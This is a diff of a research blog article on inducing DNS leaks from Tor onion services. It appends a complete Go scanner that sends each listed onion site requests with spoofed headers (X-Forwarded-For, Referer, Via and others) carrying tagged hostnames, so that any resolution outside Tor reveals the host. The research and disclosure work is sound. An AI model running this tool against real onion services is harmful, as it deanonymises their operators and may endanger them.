@@ -1,6 +1,6 @@
 # Inducing DNS Leaks in Onion Web Services
 
-_(Note: I will publish the code...after it's gone through some thorough cleaning up and the threading and concurrency mess I've created is resolved...hopefully soon.)_
+_You can now find a copy of the code at the end of this article, [here](#code)_
 
 Some time over a year ago now (I don't recall the exact dates but the timestamp on a backup copy of my code suggests around September 2016), inspired by DNS based [Canary Tokens](http://canarytokens.org/generate) I decided to follow a similar method to see if I could get remote HTTP services hosted as a Tor onion service to resolve a supplied domain name.
 
@@ -26,6 +26,7 @@ Armed with my new code, and a copy of Ahmia.fi's [onionlist.txt](https://ahmia.f
 "Okay", you ask, "cool story bro but what the fuck did you actually find?"
 
 ### Findings
+
 Out of all 26741 on the Ahmia onion list, many are now defunct and aren't available, I got 76 resolves outside of Tor. The overwhelming majority of which were due to the `X-Forwarded-For` header.
 
      74 X-Forwarded-For
@@ -137,3 +138,179 @@ probed at my listener (over Tor).
     [error] 408#408: *4208 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 176.36.117.185, server: _, request: "GET /favicon.ico HTTP/1.1", host: "[REDACTED]"
     [error] 408#408: *4211 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 176.36.117.185, server: _, request: "GET /favicon.ico HTTP/1.1", host: "woozawuzza.[REDACTED]"
     [error] 408#408: *4211 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 176.36.117.185, server: _, request: "GET /favicon.ico HTTP/1.1", host: "woozawuzza.[REDACTED]"
+
+# Code
+
+    package main
+    
+    import (
+    	"bytes"
+    	"crypto/rand"
+    	"crypto/sha256"
+    	"encoding/base32"
+    	"flag"
+    	"fmt"
+    	"io/ioutil"
+    	"net/http"
+    	"net/url"
+    	"os"
+    	"os/signal"
+    	"runtime"
+    	"sync"
+    	"time"
+    
+    	"h12.me/socks"
+    )
+    
+    var leakHeaders = map[string]string{
+    	"X-Forwarded-For":  "%s",
+    	"Forwarded":        "for=%s;proto=http;by=%[1]s;",
+    	"Origin":           "http://%s/",
+    	"Referer":          "http://%s/",
+    	"Via":              "1.1 %s",
+    	"X-Forwarded-Host": "%s",
+    	"X-Wap-Profile":    "http://%s/lol.xml",
+    	"Contact":          "root@%s",
+    	"From":             "root@%s",
+    	"True-Client-IP":   "%s",
+    	"Client-IP":        "%s",
+    	"X-Client-IP":      "%s",
+    	"X-Real-IP":        "%s",
+    	"X-Originating-IP": "%s",
+    	"CF-Connecting-IP": "%s",
+    	"X-Original-URL":   "http://%s/",
+    	"Host":             "%s",
+    }
+    
+    var die sync.WaitGroup
+    
+    var key [32]byte
+    
+    const listener = ".nsa.gov"
+    
+    const user_agent = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0"
+    
+    var b32 *base32.Encoding = base32.NewEncoding("abcdefghijklmnopqrstuvwxyz234567")
+    
+    func perr(e error, f bool) {
+    	fmt.Fprintf(os.Stderr, "[ERROR] %s\n", e)
+    	if f {
+    		os.Exit(-1)
+    	}
+    }
+    
+    func genTag(o string) string {
+    	var bin []byte
+    	bin = append(bin, key[:]...)
+    	bin = append(bin, []byte(o)...)
+    	tag := sha256.Sum256(bin)
+    	stag := b32.EncodeToString(tag[:30])
+    	fmt.Println(stag, o)
+    	return stag
+    }
+    
+    func doReq(client *http.Client, req *http.Request) error {
+    	r, e := client.Do(req)
+    	if e != nil {
+    		return e
+    	}
+    	_, _ = ioutil.ReadAll(r.Body)
+    	r.Body.Close()
+    	return nil
+    }
+    
+    func getReq(requrl *url.URL) *http.Request {
+    	return &http.Request{
+    		Method: "GET",
+    		Header: map[string][]string{
+    			"User-Agent": {user_agent},
+    		},
+    		URL:   requrl,
+    		Close: false,
+    	}
+    }
+    
+    func shouldHalt(done <-chan bool) bool {
+    	select {
+    	case <-done:
+    		return true
+    	default:
+    		return false
+    	}
+    }
+    
+    func probe(done <-chan bool, in <-chan string, wid int) {
+    	defer die.Done()
+    	defer fmt.Fprintf(os.Stderr, "[INFO] Worker %d stopping\n", wid)
+    	fmt.Fprintf(os.Stderr, "[INFO] Worker %d starting\n", wid)
+    	for o := range in {
+    		client := &http.Client{
+    			Transport: &http.Transport{
+    				Dial: socks.DialSocksProxy(socks.SOCKS5, "127.0.0.1:9050"),
+    			},
+    			Timeout: time.Duration(10 * time.Second),
+    		}
+    		reqURL, err := url.ParseRequestURI(o)
+    		if err != nil {
+    			perr(err, false)
+    			continue
+    		}
+    		req := getReq(reqURL)
+    		if shouldHalt(done) {
+    			return
+    		}
+    		if err := doReq(client, req); err != nil {
+    			perr(err, false)
+    			continue
+    		} else {
+    			client.Timeout = time.Duration(5 * time.Second)
+    		}
+    		for h, v := range leakHeaders {
+    			if shouldHalt(done) {
+    				return
+    			}
+    			req := getReq(reqURL)
+    			tag := genTag(o + " " + h)
+    			req.Header.Set(h, fmt.Sprintf(v, tag+listener))
+    			if err := doReq(client, req); err != nil {
+    				perr(err, false)
+    			}
+    		}
+    	}
+    }
+    
+    func main() {
+    	n, e := rand.Read(key[:32])
+    	if e != nil || n != 32 {
+    		perr(e, true)
+    	}
+    	onion_file := flag.String("onions", "onions.txt", "list of onion URLs to use")
+    	workers := flag.Int("workers", runtime.NumCPU(), "number of workers to run")
+    	flag.Parse()
+    	runtime.GOMAXPROCS(*workers)
+    	done := make(chan bool)
+    	in := make(chan string)
+    	for i := 0; i < *workers; i++ {
+    		die.Add(1)
+    		go probe(done, in, i+1)
+    	}
+    	raw_onions, e := ioutil.ReadFile(*onion_file)
+    	onions := bytes.Split(raw_onions, []byte{0xa})
+    	go func() {
+    		defer close(in)
+    		for _, o := range onions {
+    			if shouldHalt(done) {
+    				return
+    			} else {
+    				in <- string(o)
+    			}
+    		}
+    	}()
+    	user := make(chan os.Signal, 1)
+    	signal.Notify(user, os.Interrupt)
+    	fmt.Fprintln(os.Stderr, "[INFO] Ctrl-C to terminate.")
+    	<-user
+    	fmt.Fprintln(os.Stderr, "[INFO] Interrupt received, terminating workers.")
+    	close(done)
+    	die.Wait()
+    }
